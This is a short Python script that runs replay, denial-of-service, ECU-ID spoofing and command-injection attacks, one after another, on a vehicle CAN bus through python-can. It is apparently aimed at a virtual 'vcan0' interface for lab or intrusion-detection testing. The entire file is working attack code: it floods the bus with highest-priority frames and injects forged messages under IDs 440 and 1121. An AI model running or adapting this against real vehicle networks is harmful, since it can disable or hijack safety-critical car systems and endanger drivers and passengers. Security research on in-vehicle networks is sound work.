import can
import time
import random

def replay_attack(bus, recorded_messages, duration):
    start = time.time()
    while time.time() - start < duration:
        for msg in recorded_messages:
            bus.send(msg)
            time.sleep(0.01)

def dos_attack(bus, duration):
    msg = can.Message(arbitration_id=0x000, data=[0x00], is_extended_id=False)
    start = time.time()
    while time.time() - start < duration:
        try:
            bus.send(msg)
            print("Sending dos message")
        except Exception as e:
            print(e)
            pass

def spoofing_attack(bus, duration):
    # Change ECU ID to a valid one from vehicle spy
    spoofed_id = 440
    start = time.time()
    while time.time() - start < duration:
        msg = can.Message(arbitration_id=spoofed_id, data=[random.randint(0x00, 0x01) for _ in range(1)], is_extended_id=False)
        bus.send(msg)
        time.sleep(0.01)

def injection_attack(bus, duration):
    fake_commands = [
        can.Message(arbitration_id=440, data=[0x20], is_extended_id=False),
        can.Message(arbitration_id=1121, data=[0x03], is_extended_id=False)
    ]

    start = time.time()
    while time.time() - start < duration:
        for msg in fake_commands:
            bus.send(msg)
            time.sleep(0.01)

def capture_messages(bus, duration=2):
    captured = []
    start = time.time()
    while time.time() - start < duration:
        msg = bus.recv(timeout=1)
        if msg:
            captured.append(msg)
    return captured

def main():
    INTERFACE = 'socketcan'    
    BUSTYPE = 'can0'

    bus = can.ThreadSafeBus(interface='socketcan', channel='vcan0', receive_own_messages=True)
    recorded_messages = capture_messages(bus, duration=2)

    attacks = [
        ("Replay Attack", replay_attack, recorded_messages),
        ("DoS Attack", dos_attack, None),
        ("Spoofing Attack", spoofing_attack, None),
        ("Injection Attack", injection_attack, None),
    ]

    duration_per_attack = 30

    for name, attack_fn, arg in attacks:
        print(f"\n=== STARTING: {name} ===")
        if arg:
            attack_fn(bus, arg, duration_per_attack)
        else:
            attack_fn(bus, duration_per_attack)
        print(f"=== FINISHED: {name} ===\n")
        time.sleep(3)

    print(" All attacks have been executed.")

if __name__ == "__main__":
    main()